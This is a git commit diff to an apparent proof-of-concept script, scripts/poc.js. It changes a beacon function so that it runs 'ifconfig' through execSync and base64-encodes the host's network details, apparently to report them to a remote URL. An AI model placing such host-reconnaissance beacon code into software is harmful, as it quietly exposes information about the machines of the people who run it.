b807b6555701168547a8370e2c973cf3a88aeec7
10xray01 <110544522+xraydz@users.noreply.github.com>
2025-08-14 15:44:31 +0330

    Update poc.js

--- scripts/poc.js
+++ scripts/poc.js
@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'ip -4 addr show',
+  'ifconfig',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
